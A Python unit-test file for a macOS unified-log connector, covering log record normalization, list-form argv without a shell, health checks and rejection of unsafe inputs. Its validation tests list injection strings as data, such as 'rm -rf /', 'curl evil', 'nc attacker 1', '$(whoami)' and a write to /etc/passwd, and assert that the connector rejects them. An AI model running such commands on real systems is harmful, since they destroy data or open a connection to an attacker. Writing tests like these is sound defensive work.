"""Unit tests for the macOS unified-log connector.

These tests inject a canned/recording command runner so NO real ``log`` process
is ever spawned. They assert:

* normalization of ndjson records (timestamp, messageType -> level_or_status,
  subsystem/category/process labels, kind='logs', raw passthrough);
* malformed ndjson lines are skipped without aborting the batch;
* argv is a LIST and shell is never True (the default runner uses subprocess
  with a list argv, and our injected runner records the argv);
* injection-y predicates / levels / durations are rejected and the runner is
  NEVER called for them (fail-closed before any process spawn);
* the predicate is passed as a single discrete argv element;
* health() reports ok / not-ok and never raises.
"""

from __future__ import annotations

import json
from typing import Any

import pytest

from general_ludd.connectors.mac_unified_log import (
    MacUnifiedLogSource,
    PredicateValidationError,
    _default_runner,
)


class RecordingRunner:
    """A fake runner that records every argv it is asked to run.

    Returns a canned (rc, stdout, stderr). Because the connector only ever talks
    to the runner via the ``(argv) -> (rc, out, err)`` contract, injecting this
    guarantees no real subprocess / ``log`` invocation happens.
    """

    def __init__(self, rc: int = 0, stdout: str = "", stderr: str = "") -> None:
        self.rc = rc
        self.stdout = stdout
        self.stderr = stderr
        self.calls: list[list[str]] = []

    def __call__(self, argv: list[str]) -> tuple[int, str, str]:
        # Capture a copy so later mutation can't rewrite history.
        self.calls.append(list(argv))
        return (self.rc, self.stdout, self.stderr)


def _ndjson(*records: dict[str, Any]) -> str:
    return "\n".join(json.dumps(r) for r in records) + "\n"


SAMPLE = {
    "timestamp": "2026-06-16 09:30:00.123456-0700",
    "messageType": "Error",
    "eventMessage": "disk write failed",
    "subsystem": "com.apple.kernel",
    "category": "io",
    "processImagePath": "/usr/libexec/kernelmanagerd",
    "senderImagePath": "/System/Library/Kernels/kernel",
}


# --- contract / attributes ------------------------------------------------


def test_kind_class_attr_and_name() -> None:
    src = MacUnifiedLogSource(config={})
    assert MacUnifiedLogSource.KIND == "logs"
    assert src.KIND == "logs"
    assert src.name == "mac_unified_log"


def test_name_override_from_config() -> None:
    src = MacUnifiedLogSource(config={"name": "mac-logs-prod"})
    assert src.name == "mac-logs-prod"


def test_accepts_none_config_and_default_runner_is_used() -> None:
    src = MacUnifiedLogSource()
    # No runner injected -> the subprocess-backed default is wired in.
    assert src._runner is _default_runner


# --- normalization --------------------------------------------------------


def test_query_normalizes_single_record() -> None:
    runner = RecordingRunner(stdout=_ndjson(SAMPLE))
    src = MacUnifiedLogSource(config={"name": "macsrc"}, runner=runner)

    rows = src.query({"last": "5m"})

    assert len(rows) == 1
    row = rows[0]
    assert row["ts"] == SAMPLE["timestamp"]
    assert row["source"] == "macsrc"
    assert row["kind"] == "logs"
    assert row["level_or_status"] == "Error"
    assert row["message"] == "disk write failed"
    assert row["value"] is None
    assert row["labels"]["subsystem"] == "com.apple.kernel"
    assert row["labels"]["category"] == "io"
    assert row["labels"]["process"] == "/usr/libexec/kernelmanagerd"
    assert row["labels"]["senderImagePath"] == "/System/Library/Kernels/kernel"
    assert row["raw"] == SAMPLE


@pytest.mark.parametrize(
    "message_type",
    ["Default", "Info", "Debug", "Error", "Fault"],
)
def test_message_type_maps_to_level_or_status(message_type: str) -> None:
    rec = dict(SAMPLE, messageType=message_type)
    runner = RecordingRunner(stdout=_ndjson(rec))
    src = MacUnifiedLogSource(runner=runner)

    rows = src.query()

    assert rows[0]["level_or_status"] == message_type


def test_process_falls_back_to_process_key() -> None:
    rec = {k: v for k, v in SAMPLE.items() if k != "processImagePath"}
    rec["process"] = "loginwindow"
    runner = RecordingRunner(stdout=_ndjson(rec))
    src = MacUnifiedLogSource(runner=runner)

    rows = src.query()

    assert rows[0]["labels"]["process"] == "loginwindow"


def test_malformed_lines_are_skipped() -> None:
    good_a = dict(SAMPLE, eventMessage="first")
    good_b = dict(SAMPLE, eventMessage="second")
    stdout = (
        json.dumps(good_a)
        + "\n"
        + "{not valid json at all\n"
        + "\n"  # blank line
        + "12345\n"  # valid json but not an object
        + json.dumps(good_b)
        + "\n"
    )
    runner = RecordingRunner(stdout=stdout)
    src = MacUnifiedLogSource(runner=runner)

    rows = src.query()

    assert [r["message"] for r in rows] == ["first", "second"]


def test_missing_optional_fields_become_none() -> None:
    runner = RecordingRunner(stdout=_ndjson({"timestamp": "2026-06-16 00:00:00+0000"}))
    src = MacUnifiedLogSource(runner=runner)

    row = src.query()[0]

    assert row["level_or_status"] is None
    assert row["message"] is None
    assert row["labels"]["subsystem"] is None
    assert row["labels"]["process"] is None


def test_nonzero_rc_returns_empty_list() -> None:
    runner = RecordingRunner(rc=1, stderr="log: boom")
    src = MacUnifiedLogSource(runner=runner)

    assert src.query() == []


# --- argv construction (list form, no shell) ------------------------------


def test_argv_is_list_form_with_ndjson_and_default_last() -> None:
    runner = RecordingRunner(stdout="")
    src = MacUnifiedLogSource(runner=runner)

    src.query()

    assert len(runner.calls) == 1
    argv = runner.calls[0]
    assert isinstance(argv, list)
    assert all(isinstance(part, str) for part in argv)
    assert argv[:6] == ["log", "show", "--style", "ndjson", "--last", "5m"]
    assert "--predicate" not in argv
    assert "--level" not in argv


def test_argv_includes_level_and_predicate_as_discrete_elements() -> None:
    runner = RecordingRunner(stdout="")
    src = MacUnifiedLogSource(runner=runner)

    src.query(
        {"last": "30s", "level": "error", "predicate": 'subsystem == "com.apple.kernel"'}
    )

    argv = runner.calls[0]
    # last respected
    assert argv[argv.index("--last") + 1] == "30s"
    # level normalized + adjacent
    assert argv[argv.index("--level") + 1] == "error"
    # predicate is a SINGLE discrete argv element (not split, not interpolated)
    pred_value = argv[argv.index("--predicate") + 1]
    assert pred_value == 'subsystem == "com.apple.kernel"'


def test_default_runner_uses_list_argv_not_shell(monkeypatch: pytest.MonkeyPatch) -> None:
    """The real default runner must call subprocess.run with a LIST and never shell=True."""
    captured: dict[str, Any] = {}

    class _FakeCompleted:
        returncode = 0
        stdout = ""
        stderr = ""

    def _fake_run(argv: Any, **kwargs: Any) -> _FakeCompleted:
        captured["argv"] = argv
        captured["kwargs"] = kwargs
        return _FakeCompleted()

    monkeypatch.setattr(
        "general_ludd.connectors.mac_unified_log.subprocess.run", _fake_run
    )

    _default_runner(["log", "show", "--last", "1s"])

    assert isinstance(captured["argv"], list)
    assert captured["kwargs"].get("shell", False) is False
    assert "shell" not in captured["kwargs"] or captured["kwargs"]["shell"] is False
    assert captured["kwargs"].get("timeout") is not None


# --- injection / validation (fail closed, runner NEVER called) ------------


@pytest.mark.parametrize(
    "bad_predicate",
    [
        'subsystem == "x"; rm -rf /',
        "foo && curl evil",
        "foo | nc attacker 1",
        "$(whoami)",
        "`id`",
        "foo > /etc/passwd",
        "-x",  # leading-dash option injection
        "--predicate",  # smuggling another flag
        "",  # empty
    ],
)
def test_injection_predicate_rejected_runner_not_called(bad_predicate: str) -> None:
    runner = RecordingRunner(stdout=_ndjson(SAMPLE))
    src = MacUnifiedLogSource(runner=runner)

    with pytest.raises(PredicateValidationError):
        src.query({"predicate": bad_predicate})

    assert runner.calls == []  # fail-closed: no spawn whatsoever


@pytest.mark.parametrize(
    "bad_level",
    ["critical", "-x", "error; rm -rf /", "", "$(id)"],
)
def test_bad_level_rejected_runner_not_called(bad_level: str) -> None:
    runner = RecordingRunner(stdout="")
    src = MacUnifiedLogSource(runner=runner)

    with pytest.raises(PredicateValidationError):
        src.query({"level": bad_level})

    assert runner.calls == []


@pytest.mark.parametrize(
    "bad_last",
    ["-5m", "5x", "5m; reboot", "1 2", "", "$(date)"],
)
def test_bad_duration_rejected_runner_not_called(bad_last: str) -> None:
    runner = RecordingRunner(stdout="")
    src = MacUnifiedLogSource(runner=runner)

    with pytest.raises(PredicateValidationError):
        src.query({"last": bad_last})

    assert runner.calls == []


def test_valid_predicate_passes_through() -> None:
    runner = RecordingRunner(stdout=_ndjson(SAMPLE))
    src = MacUnifiedLogSource(runner=runner)

    rows = src.query({"predicate": 'process == "kernel" AND messageType == "Error"'})

    assert len(rows) == 1
    assert len(runner.calls) == 1


def test_level_is_case_normalized() -> None:
    runner = RecordingRunner(stdout="")
    src = MacUnifiedLogSource(runner=runner)

    src.query({"level": "ERROR"})

    argv = runner.calls[0]
    assert argv[argv.index("--level") + 1] == "error"


# --- health ---------------------------------------------------------------


def test_health_ok_when_stats_rc_zero() -> None:
    runner = RecordingRunner(rc=0)
    src = MacUnifiedLogSource(runner=runner)

    result = src.health()

    assert result["ok"] is True
    assert "detail" in result
    assert runner.calls[0][:2] == ["log", "stats"]


def test_health_falls_back_to_log_show() -> None:
    class TwoStepRunner:
        def __init__(self) -> None:
            self.calls: list[list[str]] = []

        def __call__(self, argv: list[str]) -> tuple[int, str, str]:
            self.calls.append(list(argv))
            # `log stats` fails, `log show` probe succeeds.
            if argv[:2] == ["log", "stats"]:
                return (1, "", "stats unavailable")
            return (0, "", "")

    runner = TwoStepRunner()
    src = MacUnifiedLogSource(runner=runner)

    result = src.health()

    assert result["ok"] is True
    assert len(runner.calls) == 2


def test_health_not_ok_when_all_probes_fail() -> None:
    runner = RecordingRunner(rc=1, stderr="no permission")
    src = MacUnifiedLogSource(runner=runner)

    result = src.health()

    assert result["ok"] is False
    assert isinstance(result["detail"], str)


def test_health_never_raises_even_if_runner_throws() -> None:
    def boom(argv: list[str]) -> tuple[int, str, str]:
        raise RuntimeError("subprocess exploded")

    src = MacUnifiedLogSource(runner=boom)

    result = src.health()  # must not propagate

    assert result["ok"] is False
    assert "exploded" in result["detail"] or "raised" in result["detail"]
